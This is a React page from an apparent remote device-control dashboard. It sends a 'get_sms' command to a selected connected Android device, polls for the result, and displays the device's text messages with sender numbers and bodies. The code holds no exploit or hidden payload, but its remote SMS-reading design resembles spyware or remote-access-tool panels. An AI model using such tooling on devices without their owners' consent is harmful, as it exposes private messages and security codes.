'use client'
import { Suspense } from 'react'
import { useState } from 'react'
import Sidebar from '@/components/Sidebar'
import { useDevice } from '@/contexts/DeviceContext'
import { MessageSquare, RefreshCw, Circle, Download } from 'lucide-react'

interface SmsEntry { date: string; type: string; number: string; body: string }

function parseSms(text: string): SmsEntry[] {
  const lines = text.split('\n').filter(l => l.trim() && !l.startsWith('===') && !l.startsWith('Total') && !l.startsWith('No SMS'))
  return lines.map(line => {
    const m = line.match(/^\[([^\]]+)\]\[([^\]]+)\]\s*([^:]+):\s*(.*)$/)
    if (m) return { date: m[1], type: m[2], number: m[3].trim(), body: m[4] }
    return { date: '', type: '', number: '', body: line }
  }).filter(e => e.date || e.body)
}

function SmsContent() {
  const { devices, selectedId, setSelectedId, connected } = useDevice()
  const [entries, setEntries] = useState<SmsEntry[]>([])
  const [rawText, setRawText] = useState('')
  const [loading, setLoading] = useState(false)
  const [limit, setLimit] = useState('50')

  const fetchSms = async () => {
    if (!selectedId) return
    setLoading(true)
    try {
      await fetch('/api/device/command', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ deviceId: selectedId, command: `get_sms:${limit}` }),
      })
      await new Promise(r => setTimeout(r, 3000))
      for (let i = 0; i < 10; i++) {
        const r = await fetch(`/api/device/result?deviceId=${selectedId}`)
        const d = await r.json()
        const match = (d.history ?? []).find((h: {command:string;result:string}) => h.command.startsWith('get_sms'))
        if (match?.result) { setRawText(match.result); setEntries(parseSms(match.result)); break }
        await new Promise(r2 => setTimeout(r2, 2000))
      }
    } finally { setLoading(false) }
  }

  return (
    <div className="flex min-h-screen">
      <Sidebar connected={connected} devices={devices} selectedId={selectedId} onSelect={setSelectedId} />
      <main className="flex-1 page-content overflow-y-auto">
        <div className="max-w-4xl mx-auto px-3 md:px-6 py-4 md:py-6">
          <div className="flex items-center justify-between mb-4">
            <div>
              <h2 className="text-lg md:text-xl font-bold text-white flex items-center gap-2"><MessageSquare size={20} className="text-android-green" /> SMS Messages</h2>
              <p className="text-android-muted text-xs mt-0.5">Read SMS from the connected device</p>
            </div>
            <div className={`flex items-center gap-1.5 text-xs font-medium px-2.5 py-1.5 rounded-full border ${connected ? 'text-android-green border-android-green/30 bg-android-green/10' : 'text-android-red border-android-red/30 bg-android-red/10'}`}>
              <Circle size={7} className={connected ? 'fill-android-green' : 'fill-android-red'} />{connected ? 'Online' : 'Offline'}
            </div>
          </div>

          <div className="flex gap-2 mb-4">
            <select value={limit} onChange={e => setLimit(e.target.value)}
              className="bg-android-surface border border-android-border text-android-text text-xs rounded-lg px-3 py-2 outline-none">
              <option value="20">Last 20</option><option value="50">Last 50</option>
              <option value="100">Last 100</option><option value="200">Last 200</option>
            </select>
            <button onClick={fetchSms} disabled={!connected || loading}
              className="flex items-center gap-2 px-4 py-2 bg-android-green text-android-bg rounded-lg text-sm font-semibold disabled:opacity-40 disabled:cursor-not-allowed">
              {loading ? <RefreshCw size={14} className="animate-spin" /> : <Download size={14} />}
              {loading ? 'Fetching…' : 'Fetch SMS'}
            </button>
          </div>

          {!connected && <div className="p-8 text-center text-android-muted text-sm bg-android-surface border border-android-border rounded-xl"><MessageSquare size={32} className="mx-auto mb-3 text-android-border" />Connect a device to read SMS</div>}

          {connected && entries.length === 0 && !loading && rawText === '' && (
            <div className="p-8 text-center text-android-muted text-sm bg-android-surface border border-android-border rounded-xl">
              <MessageSquare size={32} className="mx-auto mb-3 text-android-border" />
              <p>Click "Fetch SMS" to load messages from the device</p>
            </div>
          )}

          {rawText && entries.length === 0 && (
            <pre className="bg-android-surface border border-android-border rounded-xl p-4 text-xs text-android-text whitespace-pre-wrap">{rawText}</pre>
          )}

          {entries.length > 0 && (
            <div className="space-y-2">
              <p className="text-xs text-android-muted mb-2">{entries.length} messages</p>
              {entries.map((e, i) => (
                <div key={i} className={`bg-android-surface border border-android-border rounded-xl p-3 flex gap-3 ${e.type.includes('IN') ? 'border-l-2 border-l-android-green/50' : 'border-l-2 border-l-android-blue/50'}`}>
                  <div className="shrink-0">
                    <span className={`text-xs font-bold px-2 py-0.5 rounded ${e.type.includes('IN') ? 'bg-android-green/10 text-android-green' : 'bg-android-blue/10 text-android-blue'}`}>{e.type.includes('IN') ? '▼ IN' : '▲ OUT'}</span>
                  </div>
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center justify-between mb-1">
                      <span className="text-android-text text-sm font-semibold font-mono">{e.number}</span>
                      <span className="text-android-muted text-xs">{e.date}</span>
                    </div>
                    <p className="text-android-muted text-sm break-words">{e.body}</p>
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>
      </main>
    </div>
  )
}

export default function SmsPage() {
  return (
    <Suspense fallback={<div className="flex min-h-screen items-center justify-center text-android-muted text-sm">Loading…</div>}>
      <SmsContent />
    </Suspense>
  )
}
